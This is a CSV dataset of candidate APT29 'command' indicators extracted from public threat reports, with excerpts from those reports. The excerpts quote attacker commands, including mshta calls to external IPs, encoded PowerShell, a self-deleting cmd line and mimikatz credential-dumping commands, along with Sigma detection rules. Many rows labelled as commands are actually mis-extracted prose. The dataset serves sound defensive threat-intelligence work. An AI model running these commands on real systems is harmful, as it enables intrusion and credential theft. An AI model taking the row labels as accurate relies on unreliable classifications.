schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:b4a1ddddbdd529e69ff21a0055d4732560ba54fded7505942e7848380c4691ea,observation--sha256:85a2d2491a7ce4d960d6e83c31113cbc17ebd66e07ebf404238c018d4748fcf1,command,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 97}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"96Easter Bunny This command allows you to process a command sent from the C2 encoded in Base64. The encoded command will have a fixed structure so that it can be processed correctly: 3.4.3. 1 SEND COMMAND If we want it to be executed in iteration 2, we will encode the following in Base64: EXAMPLE OF USE 2 0 %SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME% $(COMPUTERNAME) COMPUTERNAME Finally, it will send the following command: :mnxqsq MgowCiVTWVNURU1ST09UJVxTeXN0ZW0",
1.0.0,actor--apt29,artifact--sha256:026b53a01833f52c4ac53a7d281fd86e53e10679775e5fed755339a5157bf161,observation--sha256:559b40817c3c38caa650a53513274e0edbf98b65cca0a321ca1261b3b47aef36,command,- 'WMIC.exe,- 'WMIC.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:db2afa5ee5a432ff08d1f1cf90ad713a4c2bc35514a8a8076708a57c55e57865,observation--sha256:beed1ec2d80aa8b57b44b33a90c12d1d185cce248f68c528c2cc2a491ecb917c,command,- 'rundll32,- 'rundll32,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:0e98bb3b8e0448b96a1619a1bd122854eca295a3de84c0e0c6dc045fbee94c02,observation--sha256:ee7b3a4b2668e7392def6a20eb850003f150f51abc181c1acb6c902d526430b2,command,- 'schtasks.exe,- 'schtasks.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 19 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR condition: selection title: Scheduled tasks names used by SVR for GraphicalProton backdoor description: Hunts for known SVR-specific scheduled task names author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'schtasks.exe' CommandLine|contains: - 'IISUpdateService' - 'WindowsDefenderService' - 'WindowsDefenderService2' - 'DefenderServic,
1.0.0,actor--apt29,artifact--sha256:e8ca0e54d3d8f2cb0431fb258e7639938281f5a4947af12ba795d4b285569bd6,observation--sha256:e4c965074ba1b47d1ae10ab7f086701d87d672c4c88dabc7962d399c5f52d7f8,command,206 powershell -nop -enc,206 powershell -nop -enc,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 21}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group Occurance Command Explanation 2880 nltest /dclist : Lists all domain controllers in the domain. 2283 nltest /domain_trusts Returns a list of trusted domains. 1547 cmdkey /list Displays the list of stored user names and credentials. 670 net group ”domain admins” /domain Lists domain admin users. 537 dir c:\\programdata Prints the contents of ”programdata” directory (used for enumerating the installed software) 206 powershell -nop -enc %Trimmed...% Executes the BASE6,
1.0.0,actor--apt29,artifact--sha256:09c6e0e8624c6138bb1573aa9b69e10f8c7fbda123128186b650d8ca23f9c40c,observation--sha256:690e0ed8f53049feb6844ee3bf3fa18595d168cca3338cec5cca928c464c7262,command,34. // Check if DLL was executed by Note.exe or rundll32.exe,34. // Check if DLL was executed by Note.exe or rundll32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/20 msword.dll This module facilitates OPSEC (unhooking, checking for sleep() emulation, checking for process tree). The module contains a large number of inlined string decryption routines. The following listing presents (heavily) cleaned-up code of the msword.dll get export that is called by AppvIsvSubsystems64.dll: 1. __int64 get() 2. { 3. // 4. pUnhookedAPIs = getAPIs(&UnhookedAPIs); 5. pProcessModules = &UnhookedAPIs.K32EnumProcessM",
1.0.0,actor--apt29,artifact--sha256:d35727ed63b620a341332eb3710a133889175ee2911fd9a57ae5ec78afd6c700,observation--sha256:c0a7128e4472668b061293a5584baa5a8b91f906ebb1fe54cb433802c3054c4e,command,[4] Bleeping Computer. PowerShell Empire | Building an Empire with PowerShell . url : https:,4] Bleeping Computer. PowerShell Empire | Building an Empire with PowerShell . url : https:,candidate,2020-12-13T00:00:00Z,day,known,same-record,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 47}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Références [1] Bloomberg. Russian ‘Evil Corp’ Is Behind a Decade of Hacks, U.S. Says . url : https : / / www . bloomberg . com / news / articles / 2019 - 12 - 05 / u - s - sanctions - evil - corp - blamed-for-100-million-cyber-theft. (accessed : 13.03.2021). [2] CloudFlare. Trend data on the SolarWinds Orion compromise . url : https : / / blog . cloudflare.com/solarwinds-orion-compromise-trend-data/. (accessed : 14.03.2021). [3] CNN. US agencies investigating hacki",
1.0.0,actor--apt29,artifact--sha256:52b70a150b0e23b71606ef6783402a0b5803d5e5d660330796c33002c4c04a06,observation--sha256:62746cff944ab84c806fa227afee90856d0ea38f8362a8c546b8203a94051d1a,command,"After de-obfuscating and extracting the decrypted payload inside the Powershell files, we","After de-obfuscating and extracting the decrypted payload inside the Powershell files, we",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:eb8ef246ea40cbe071785802f734cd7de4101003404df0879adc5c60f57b3893,observation--sha256:94d1bc89657ebaf495c4f67cc1e92d779c08800fec678a9a043dbd46c37c15f4,command,"At the end of the analysis on the subject Powershell files, the PTI Team was able to extract","At the end of the analysis on the subject Powershell files, the PTI Team was able to extract",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:4fedce095b2a366bdee178fac27ea7ce6cc9dcc38ae05c214306028fed3c5195,observation--sha256:357c60f290dd1c29a2d227c914583c6bc9cb4205ba62336efaf2d951ff22488a,command,"BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly.","BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly",candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly. Technical Analysis Infrastructure On October 25, 2022, we identified the domain totalmassasje[.]no delivering the malicious ZIP file“schedule.zip” via the webpage “schedule.php”. This webpage contains lure text masquerading as an“Ambassad",
1.0.0,actor--apt29,artifact--sha256:81b6ddb79f2bdf4118308f22a83bee019a57926ad57aa712a755e139bf3ffe8b,observation--sha256:0cd292472ac94526ae7c9ed937debf8bfeb9c0bbfca2e693986f8bd4988b5983,command,Command Line (WMIC) [T1047,Command Line (WMIC) [T1047,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:a824eb27524659fe1bed8bd34a774bf3578bc7e84f635e9cdb3246a5579f7734,observation--sha256:c7681857ced428e7cad4ef46e1d1b2e18a2c56148a43148d39bf2029051e2b7b,command,During the analysis of executed commands the PTI team discovered multiple uses of mshta,During the analysis of executed commands the PTI team discovered multiple uses of mshta,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:7d70ddde9f3f4819491e9d450424f0eecb11fc10a63bfc63fc7659d161055cd3,observation--sha256:620da173ba9b8678035697edd904015727663741a07e31708c2c81b23e20488e,command,Executes the BASE64 encoded powershell,Executes the BASE64 encoded powershell,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 21}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group Occurance Command Explanation 2880 nltest /dclist : Lists all domain controllers in the domain. 2283 nltest /domain_trusts Returns a list of trusted domains. 1547 cmdkey /list Displays the list of stored user names and credentials. 670 net group ”domain admins” /domain Lists domain admin users. 537 dir c:\\programdata Prints the contents of ”programdata” directory (used for enumerating the installed software) 206 powershell -nop -enc %Trimmed...% Executes the BASE6,
1.0.0,actor--apt29,artifact--sha256:d914e2cbdf47088e18266257a27dbf95157f4867ff760668a0658c1784cfb600,observation--sha256:f22e51c9e3ccb046c271c05be181a256eaa5a36230a31370aadb4f1cbfbea9e9,command,Figure 26. Decoded Cobalt Strike beacon loader Powershell code,Figure 26. Decoded Cobalt Strike beacon loader Powershell code,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:d1230775505ebac31b0f49b9356bfa0147b5d547506557e7971af311b6a6ef2d,observation--sha256:257653989f70f218dd9e59b3f223a65fed34896c41e2f05c4bae73bf7b0c146b,command,"In 2021, public reporting detailed BlueBravo’s use of variousiterationsof aphishing campaignemulatinggovernment entities. The various campaigns delivered ISO files via methods such asusingURLs todownload the ISO file and execute an LNK file, and usingan HTMLattachmentin the email to initiatethe download of an ISO file. This activity was used to deployNativeZone, an umbrella term for theircustom Cobalt Strike loaders. NativeZone typically uses rundll32.exe to load and execute follow-onpayload(s).","In 2021, public reporting detailed BlueBravo’s use of variousiterationsof aphishing campaignemulatinggovernment entities. The various campaigns delivered ISO files via methods such asusingURLs todownload the ISO file and execute an LNK file, and usingan HTMLattachmentin the email to initiatethe download of an ISO file. This activity was used to deployNativeZone, an umbrella term for theircustom Cobalt Strike loaders. NativeZone typically uses rundll32.exe to load and execute follow-onpayload(s",candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS represents an ongoing interest from threat actors affiliated with the SVR and aligns with their continuedintent to gain access to strategic information from entities and organizations engaged in foreign policy.Any country with a nexus to the Ukraine crisis, particularly those with key geopolitical, economic, ormilitary relationships with Russia or Ukraine, are at increased risk of targeting. Key Judgments ● We have identified new malware used by BlueBravo, which overlaps wi",
1.0.0,actor--apt29,artifact--sha256:53b880f0a78a28c684ffa0f1c5a7bb9bc6eedc3decb22e5dbb29dffe090d8797,observation--sha256:f9e9ff1fe41e6420ce998a514fc570f549a652afb1341780685b7557d5068216,command,Meterpreter and Powershell Empire. The major difference is that Koadic does most of,Meterpreter and Powershell Empire. The major difference is that Koadic does most of,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 22}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group During the investigation of executed commands, the PTI Team noticed that the IP addresses used for downloading post-exploitation scripts also matched the characteristics of the initial databasegalore.com domain used for fingerprinting the SilverFish infrastructure. The IP was serving the same bootstrap theme on port 80 and PowerMTA service on port 9897 (see in Figure 21). Figure 21. IP within C&C linking back to another server with the same fingerprint 3.3.1 Koadic",
1.0.0,actor--apt29,artifact--sha256:560d4e7a1916713281c7922d18757039c3950f5e1eeee820bfb6ea9b70a85e45,observation--sha256:b9a2145d531279a40c645837d791c7c36055a39a6dc3aa6dded791bc3d5951cd,command,Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\,Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:4df2c30b6e02f2174366abd69179c49cd02e09ada6edb50c76da04830ca36440,observation--sha256:aaf2869367d0b2ed27aa122f9e18132029bdbee5c064ab012bc2c05f956468c3,command,PSVersion: < <Powershell Version> > \n,PSVersion: < <Powershell Version> > \n,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:dbf348832054ddca3e4f18938eb05d209749d05ca6a39d49ceabea866aac7a9e,observation--sha256:db6f6fb2a41eabb57b28cc3f7323e1db7118288045a570c15c4c26a1cdc68f96,command,"Powershell\0\PowerShellEngine. If it is not installed or there is an error, it","Powershell\0\PowerShellEngine. If it is not installed or there is an error, it",candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:812e5eeaf826ce59439124bbf1b7f6e95d95e210be0b9a96baa365db6a5cc2c0,observation--sha256:1ef012e0c4ab149491389f309dd0a9fc3fc188168490e4df9149ebf69f8c433b,command,"SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\","SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:0f11d751b437dcc77299a77392ceded3d3c7f8626531ab28cfd750b69ac88de3,observation--sha256:454e6a7f50705c6bf19608ef4f7f4e830b0b4b08ebf7f745157226c8f794036e,command,SVR cyber actors execute these powershell commands to perform host,SVR cyber actors execute these powershell commands to perform host,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:45d4d999e495c67cfe62d5ee4b3e43c1a44c962eeb8f7fbe2f9c416f9a3dda9d,observation--sha256:5781eb213c20f331bd2ceab52bacc578f93e61b2a0cc5f251bc42c3fcba651db,command,SVR cyber actors used powershell commands to compress Microsoft SQL,SVR cyber actors used powershell commands to compress Microsoft SQL,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:2e561cd0d03bb40dcc8818b73c2181899ee59af7818ae7d0dc5ed971bbedd0c4,observation--sha256:89c49d1bc52626fbf302cf20032851fa24275bf95deffffe5b3db01c66cd10c1,command,"Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required","Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 13}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Spawn new shell session (port 143) Spawn new shell session (port 443) (+amsi.dll patch WIN10 ONLY) Spawn new shell session (port 443) (+amsiInitFailed=true WIN10 ONLY) TEST Spawn new bot instance Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required + console shown. Blocked by WD Spawn new bot instance elevated (eventvwr, WIN7, WIN8.1) Spawn new bot instance elevated (sdclt, build>=14393, WIN10) WD alert, instance dies, still works ",
1.0.0,actor--apt29,artifact--sha256:7263fcde3ce38f7f1f8f905cf7eef02c8fb6aa4ace3781ee4058d1cc3d0031ab,observation--sha256:e5684c93a8be00193ebda43616c67da49483940df59c6bb1ff76a5dde9b2d903,command,The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex,The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/24 The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex editor illustrates the shortcut target: Figure 8 - Content of the lnk file used to start SNOWYAMBER,
1.0.0,actor--apt29,artifact--sha256:b5f837d42363f8c112e5a695365d61ef0e4a671679c0e8b1fcea05f8e5dc712d,observation--sha256:274a8e116048ab2a89177f243b22fac0f77642b7d176754e62958e2757c38d1f,command,The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of,The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:c1b6ce5c3e23591dbb593ede554433d649e21b86339d1bbc811b2febdc2d6f64,observation--sha256:df0fd6eba32d091cfc8391ba6b3a3a083e9538510eaaca920101a9f99ce7ad2c,command,"The SVR used WMIC to facilitate lateral movement [T1047],[T1210].","The SVR used WMIC to facilitate lateral movement [T1047],[T1210",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:6647ce9779153b52567ff9ac7b1a8d10cc937367e9f904277abec9fe62221fdd,observation--sha256:54d2910ef753d31c3b1031902e77e45bdc61d24edde71b713f0867899d37df6b,command,The recognition continues to obtain the version of Powershell installed,The recognition continues to obtain the version of Powershell installed,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:a4d9aae394f5965fdce8abe50ec5387efe4e559e93787a843087ad8894582e7f,observation--sha256:fdcba2df1a91d4c5d5024fb574f777ce71ee88c415b062534910cfdc9e81120f,command,and encoded Powershell commands. The decoded and decompressed Powershell,and encoded Powershell commands. The decoded and decompressed Powershell,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:1ef70a65c70a94ccf1335c88ca183d520e0d3e2c3f2d2a33fc96cf831802621b,observation--sha256:f177be819a0da58d929569aac0599a30baddd3267e41e38ebce20367d36abd1e,command,"arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of","arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
